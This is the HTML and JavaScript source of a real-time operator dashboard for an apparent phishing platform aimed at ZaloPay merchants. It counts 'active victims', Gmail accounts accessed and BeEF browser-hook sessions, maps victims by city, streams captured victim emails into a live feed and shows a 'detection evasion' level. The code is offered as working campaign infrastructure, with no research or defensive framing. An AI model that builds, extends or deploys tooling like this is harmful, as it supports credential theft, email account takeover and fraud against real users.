<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-time Dashboard - ZaloPay Phishing Platform</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <!-- Leaflet for maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <style>
        .dashboard-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .metric-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            border-left: 4px solid #007bff;
        }
        
        .metric-card.success { border-left-color: #28a745; }
        .metric-card.warning { border-left-color: #ffc107; }
        .metric-card.danger { border-left-color: #dc3545; }
        .metric-card.info { border-left-color: #17a2b8; }
        
        .chart-container {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
        }
        
        .activity-feed {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .activity-item {
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
        }
        
        .activity-item:last-child {
            border-bottom: none;
        }
        
        .activity-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-size: 16px;
            color: white;
        }
        
        .activity-icon.victim { background: #dc3545; }
        .activity-icon.gmail { background: #ea4335; }
        .activity-icon.beef { background: #28a745; }
        .activity-icon.system { background: #6c757d; }
        
        .victim-map {
            height: 400px;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
        }
        
        .status-online { background: #28a745; }
        .status-offline { background: #dc3545; }
        .status-warning { background: #ffc107; }
        
        .real-time-badge {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .evasion-progress-full {
            width: 95% !important;
        }
        
        .notification-toast {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1050;
            min-width: 300px;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <!-- Header -->
        <div class="row mb-4">
            <div class="col-12">
                <div class="dashboard-card">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h1 class="h3 mb-0">
                                <i class="fas fa-tachometer-alt me-2"></i>
                                Real-time Dashboard
                                <span class="badge bg-success real-time-badge ms-2">LIVE</span>
                            </h1>
                            <p class="mb-0">ZaloPay Merchant Phishing Platform - Live Monitoring</p>
                        </div>
                        <div class="d-flex align-items-center">
                            <div class="me-3">
                                <span class="status-indicator status-online"></span>
                                <span class="text-white">System Online</span>
                            </div>
                            <div class="me-3">
                                <span class="text-white">Last Update: <span id="lastUpdate">--</span></span>
                            </div>
                            <button class="btn btn-light" onclick="toggleAutoRefresh()">
                                <i class="fas fa-sync-alt" id="refreshIcon"></i>
                                <span id="refreshText">Auto Refresh</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Key Metrics Row -->
        <div class="row mb-4">
            <div class="col-xl-3 col-md-6 mb-3">
                <div class="metric-card success">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h6 class="text-muted mb-1">Active Victims</h6>
                            <h3 class="mb-0" id="activeVictims">0</h3>
                            <small class="text-success" id="victimsChange">+0 today</small>
                        </div>
                        <i class="fas fa-users fa-2x text-success"></i>
                    </div>
                </div>
            </div>
            
            <div class="col-xl-3 col-md-6 mb-3">
                <div class="metric-card info">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h6 class="text-muted mb-1">Gmail Access</h6>
                            <h3 class="mb-0" id="gmailAccess">0</h3>
                            <small class="text-info" id="gmailChange">+0 today</small>
                        </div>
                        <i class="fas fa-envelope fa-2x text-info"></i>
                    </div>
                </div>
            </div>
            
            <div class="col-xl-3 col-md-6 mb-3">
                <div class="metric-card warning">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h6 class="text-muted mb-1">BeEF Sessions</h6>
                            <h3 class="mb-0" id="beefSessions">0</h3>
                            <small class="text-warning" id="beefChange">+0 today</small>
                        </div>
                        <i class="fas fa-bug fa-2x text-warning"></i>
                    </div>
                </div>
            </div>
            
            <div class="col-xl-3 col-md-6 mb-3">
                <div class="metric-card danger">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h6 class="text-muted mb-1">Success Rate</h6>
                            <h3 class="mb-0" id="successRate">0%</h3>
                            <small class="text-danger" id="rateChange">+0% today</small>
                        </div>
                        <i class="fas fa-chart-line fa-2x text-danger"></i>
                    </div>
                </div>
            </div>
        </div>

        <!-- Charts Row -->
        <div class="row mb-4">
            <div class="col-xl-8 col-lg-7 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-chart-area me-2"></i>
                        Victim Acquisition Timeline
                    </h5>
                    <canvas id="victimTimelineChart"></canvas>
                </div>
            </div>
            
            <div class="col-xl-4 col-lg-5 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-chart-pie me-2"></i>
                        Geographic Distribution
                    </h5>
                    <canvas id="geographicChart"></canvas>
                </div>
            </div>
        </div>

        <!-- Map and Activity Row -->
        <div class="row mb-4">
            <div class="col-xl-8 col-lg-7 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-globe me-2"></i>
                        Victim World Map
                    </h5>
                    <div id="victimMap" class="victim-map"></div>
                </div>
            </div>
            
            <div class="col-xl-4 col-lg-5 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-stream me-2"></i>
                        Live Activity Feed
                    </h5>
                    <div class="activity-feed" id="activityFeed">
                        <div class="text-center text-muted py-4">
                            <i class="fas fa-spinner fa-spin fa-2x mb-2"></i>
                            <p>Loading activity feed...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- System Status Row -->
        <div class="row mb-4">
            <div class="col-xl-6 col-lg-6 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-server me-2"></i>
                        System Performance
                    </h5>
                    <canvas id="systemPerformanceChart"></canvas>
                </div>
            </div>
            
            <div class="col-xl-6 col-lg-6 mb-3">
                <div class="chart-container">
                    <h5 class="mb-3">
                        <i class="fas fa-shield-alt me-2"></i>
                        Security Status
                    </h5>
                    <div class="row">
                        <div class="col-6">
                            <div class="text-center">
                                <h4 class="text-success" id="proxyHealth">100%</h4>
                                <small class="text-muted">Proxy Health</small>
                            </div>
                        </div>
                        <div class="col-6">
                            <div class="text-center">
                                <h4 class="text-info" id="encryptionStatus">Active</h4>
                                <small class="text-muted">Encryption</small>
                            </div>
                        </div>
                    </div>
                    <div class="mt-3">
                        <div class="d-flex justify-content-between mb-1">
                            <small>Detection Evasion</small>
                            <small id="evasionLevel">High</small>
                        </div>
                        <div class="progress">
                            <div class="progress-bar bg-success evasion-progress-full" role="progressbar" aria-label="Detection Evasion Level: High (95%)" id="evasionProgress"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Notification Toast Container -->
    <div id="notificationContainer" class="notification-toast"></div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Dashboard JavaScript -->
    <script>
        // Global variables
        let charts = {};
        let victimMap;
        let autoRefresh = true;
        let refreshInterval;
        let websocket;
        
        // Initialize dashboard
        document.addEventListener('DOMContentLoaded', function() {
            initializeCharts();
            initializeMap();
            initializeWebSocket();
            startAutoRefresh();
            loadInitialData();
        });
        
        // Initialize charts
        function initializeCharts() {
            // Victim Timeline Chart
            const timelineCtx = document.getElementById('victimTimelineChart').getContext('2d');
            charts.timeline = new Chart(timelineCtx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Victims Captured',
                        data: [],
                        borderColor: '#007bff',
                        backgroundColor: 'rgba(0, 123, 255, 0.1)',
                        tension: 0.4,
                        fill: true
                    }, {
                        label: 'Gmail Access',
                        data: [],
                        borderColor: '#28a745',
                        backgroundColor: 'rgba(40, 167, 69, 0.1)',
                        tension: 0.4,
                        fill: true
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    },
                    plugins: {
                        legend: {
                            position: 'top'
                        }
                    }
                }
            });
            
            // Geographic Distribution Chart
            const geoCtx = document.getElementById('geographicChart').getContext('2d');
            charts.geographic = new Chart(geoCtx, {
                type: 'doughnut',
                data: {
                    labels: ['Vietnam', 'United States', 'United Kingdom', 'Canada', 'Australia', 'Other'],
                    datasets: [{
                        data: [45, 20, 15, 10, 5, 5],
                        backgroundColor: [
                            '#dc3545',
                            '#007bff',
                            '#28a745',
                            '#ffc107',
                            '#6f42c1',
                            '#6c757d'
                        ]
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'bottom'
                        }
                    }
                }
            });
            
            // System Performance Chart
            const perfCtx = document.getElementById('systemPerformanceChart').getContext('2d');
            charts.performance = new Chart(perfCtx, {
                type: 'bar',
                data: {
                    labels: ['CPU Usage', 'Memory Usage', 'Disk Usage', 'Network I/O'],
                    datasets: [{
                        label: 'Current Usage (%)',
                        data: [25, 40, 15, 30],
                        backgroundColor: [
                            '#007bff',
                            '#28a745',
                            '#ffc107',
                            '#dc3545'
                        ]
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            max: 100
                        }
                    }
                }
            });
        }
        
        // Initialize world map
        function initializeMap() {
            victimMap = L.map('victimMap').setView([20.0, 105.0], 4);
            
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: 'Â© OpenStreetMap contributors'
            }).addTo(victimMap);
            
            // Add sample victim markers
            addVictimMarkers();
        }
        
        // Add victim markers to map
        function addVictimMarkers() {
            const victims = [
                { lat: 21.0285, lng: 105.8542, city: 'Hanoi', count: 15 },
                { lat: 10.8231, lng: 106.6297, city: 'Ho Chi Minh City', count: 23 },
                { lat: 16.0544, lng: 108.2022, city: 'Da Nang', count: 8 },
                { lat: 40.7128, lng: -74.0060, city: 'New York', count: 12 },
                { lat: 34.0522, lng: -118.2437, city: 'Los Angeles', count: 9 },
                { lat: 51.5074, lng: -0.1278, city: 'London', count: 7 },
                { lat: 43.6532, lng: -79.3832, city: 'Toronto', count: 5 }
            ];
            
            victims.forEach(victim => {
                const marker = L.circleMarker([victim.lat, victim.lng], {
                    radius: Math.max(5, victim.count),
                    fillColor: '#dc3545',
                    color: '#fff',
                    weight: 2,
                    opacity: 1,
                    fillOpacity: 0.8
                }).addTo(victimMap);
                
                marker.bindPopup(`
                    <strong>${victim.city}</strong><br>
                    Victims: ${victim.count}<br>
                    Status: Active
                `);
            });
        }
        
        // Initialize WebSocket connection
        function initializeWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/ws/dashboard`;
            
            websocket = new WebSocket(wsUrl);
            
            websocket.onopen = function() {
                console.log('WebSocket connected');
                showNotification('WebSocket Connected', 'Real-time updates enabled', 'success');
            };
            
            websocket.onmessage = function(event) {
                const data = JSON.parse(event.data);
                handleRealtimeUpdate(data);
            };
            
            websocket.onclose = function() {
                console.log('WebSocket disconnected');
                showNotification('WebSocket Disconnected', 'Attempting to reconnect...', 'warning');
                setTimeout(initializeWebSocket, 5000);
            };
            
            websocket.onerror = function(error) {
                console.error('WebSocket error:', error);
                showNotification('WebSocket Error', 'Connection failed', 'danger');
            };
        }
        
        // Handle real-time updates
        function handleRealtimeUpdate(data) {
            switch(data.type) {
                case 'victim_captured':
                    updateVictimMetrics(data.data);
                    addActivityItem('victim', `New victim captured: ${data.data.email}`, data.timestamp);
                    break;
                case 'gmail_access_update':
                    updateGmailMetrics(data.data);
                    addActivityItem('gmail', `Gmail access obtained for ${data.data.victim_id}`, data.timestamp);
                    break;
                case 'beef_session_update':
                    updateBeEFMetrics(data.data);
                    addActivityItem('beef', `BeEF session established: ${data.data.session_id}`, data.timestamp);
                    break;
                case 'metrics_update':
                    updateSystemMetrics(data.data);
                    break;
                case 'system_alert':
                    showNotification('System Alert', data.data.message, 'warning');
                    break;
            }
            
            updateLastUpdateTime();
        }
        
        // Update victim metrics
        function updateVictimMetrics(data) {
            const activeVictims = document.getElementById('activeVictims');
            const victimsChange = document.getElementById('victimsChange');
            
            const currentCount = parseInt(activeVictims.textContent) || 0;
            activeVictims.textContent = currentCount + 1;
            
            // Update chart
            const now = new Date();
            const timeLabel = now.toLocaleTimeString();
            charts.timeline.data.labels.push(timeLabel);
            charts.timeline.data.datasets[0].data.push(currentCount + 1);
            
            // Keep only last 20 data points
            if (charts.timeline.data.labels.length > 20) {
                charts.timeline.data.labels.shift();
                charts.timeline.data.datasets[0].data.shift();
            }
            
            charts.timeline.update();
        }
        
        // Update Gmail metrics
        function updateGmailMetrics(data) {
            const gmailAccess = document.getElementById('gmailAccess');
            const gmailChange = document.getElementById('gmailChange');
            
            const currentCount = parseInt(gmailAccess.textContent) || 0;
            gmailAccess.textContent = currentCount + 1;
            
            // Update chart
            charts.timeline.data.datasets[1].data.push(currentCount + 1);
            
            // Keep only last 20 data points
            if (charts.timeline.data.datasets[1].data.length > 20) {
                charts.timeline.data.datasets[1].data.shift();
            }
            
            charts.timeline.update();
        }
        
        // Update BeEF metrics
        function updateBeEFMetrics(data) {
            const beefSessions = document.getElementById('beefSessions');
            const beefChange = document.getElementById('beefChange');
            
            const currentCount = parseInt(beefSessions.textContent) || 0;
            beefSessions.textContent = currentCount + 1;
        }
        
        // Update system metrics
        function updateSystemMetrics(data) {
            if (data.cpu !== undefined) {
                charts.performance.data.datasets[0].data[0] = data.cpu;
            }
            if (data.memory !== undefined) {
                charts.performance.data.datasets[0].data[1] = data.memory;
            }
            if (data.disk !== undefined) {
                charts.performance.data.datasets[0].data[2] = data.disk;
            }
            if (data.network !== undefined) {
                charts.performance.data.datasets[0].data[3] = data.network;
            }
            
            charts.performance.update();
        }
        
        // Add activity item to feed
        function addActivityItem(type, message, timestamp) {
            const activityFeed = document.getElementById('activityFeed');
            
            // Remove loading message if present
            const loadingMsg = activityFeed.querySelector('.text-center');
            if (loadingMsg) {
                loadingMsg.remove();
            }
            
            const activityItem = document.createElement('div');
            activityItem.className = 'activity-item';
            
            const iconClass = {
                'victim': 'fas fa-user',
                'gmail': 'fas fa-envelope',
                'beef': 'fas fa-bug',
                'system': 'fas fa-cog'
            }[type] || 'fas fa-info-circle';
            
            activityItem.innerHTML = `
                <div class="activity-icon ${type}">
                    <i class="${iconClass}"></i>
                </div>
                <div class="flex-grow-1">
                    <div class="fw-bold">${message}</div>
                    <small class="text-muted">${new Date(timestamp).toLocaleString()}</small>
                </div>
            `;
            
            activityFeed.insertBefore(activityItem, activityFeed.firstChild);
            
            // Keep only last 10 items
            const items = activityFeed.querySelectorAll('.activity-item');
            if (items.length > 10) {
                items[items.length - 1].remove();
            }
        }
        
        // Show notification
        function showNotification(title, message, type = 'info') {
            const container = document.getElementById('notificationContainer');
            
            const toast = document.createElement('div');
            toast.className = `toast show`;
            toast.innerHTML = `
                <div class="toast-header bg-${type} text-white">
                    <strong class="me-auto">${title}</strong>
                    <button type="button" class="btn-close btn-close-white" onclick="this.closest('.toast').remove()"></button>
                </div>
                <div class="toast-body">
                    ${message}
                </div>
            `;
            
            container.appendChild(toast);
            
            // Auto-remove after 5 seconds
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.remove();
                }
            }, 5000);
        }
        
        // Update last update time
        function updateLastUpdateTime() {
            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
        }
        
        // Toggle auto refresh
        function toggleAutoRefresh() {
            autoRefresh = !autoRefresh;
            const refreshIcon = document.getElementById('refreshIcon');
            const refreshText = document.getElementById('refreshText');
            
            if (autoRefresh) {
                refreshIcon.className = 'fas fa-sync-alt';
                refreshText.textContent = 'Auto Refresh';
                startAutoRefresh();
            } else {
                refreshIcon.className = 'fas fa-pause';
                refreshText.textContent = 'Paused';
                stopAutoRefresh();
            }
        }
        
        // Start auto refresh
        function startAutoRefresh() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
            }
            
            refreshInterval = setInterval(() => {
                if (autoRefresh) {
                    loadDashboardData();
                }
            }, 5000); // Refresh every 5 seconds
        }
        
        // Stop auto refresh
        function stopAutoRefresh() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
                refreshInterval = null;
            }
        }
        
        // Load initial data
        function loadInitialData() {
            loadDashboardData();
            updateLastUpdateTime();
        }
        
        // Load dashboard data
        function loadDashboardData() {
            fetch('/api/admin/dashboard/realtime')
                .then(response => response.json())
                .then(data => {
                    updateDashboardMetrics(data);
                })
                .catch(error => {
                    console.error('Error loading dashboard data:', error);
                });
        }
        
        // Update dashboard metrics
        function updateDashboardMetrics(data) {
            if (data.victims) {
                document.getElementById('activeVictims').textContent = data.victims.active || 0;
                document.getElementById('victimsChange').textContent = `+${data.victims.today || 0} today`;
            }
            
            if (data.gmail) {
                document.getElementById('gmailAccess').textContent = data.gmail.access_count || 0;
                document.getElementById('gmailChange').textContent = `+${data.gmail.today || 0} today`;
            }
            
            if (data.beef) {
                document.getElementById('beefSessions').textContent = data.beef.active_sessions || 0;
                document.getElementById('beefChange').textContent = `+${data.beef.today || 0} today`;
            }
            
            if (data.success_rate !== undefined) {
                document.getElementById('successRate').textContent = `${data.success_rate}%`;
                document.getElementById('rateChange').textContent = `${data.success_rate_change > 0 ? '+' : ''}${data.success_rate_change}% today`;
            }
            
            if (data.system) {
                updateSystemMetrics(data.system);
            }
        }
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', function() {
            if (websocket) {
                websocket.close();
            }
            stopAutoRefresh();
        });
    </script>
</body>
</html>
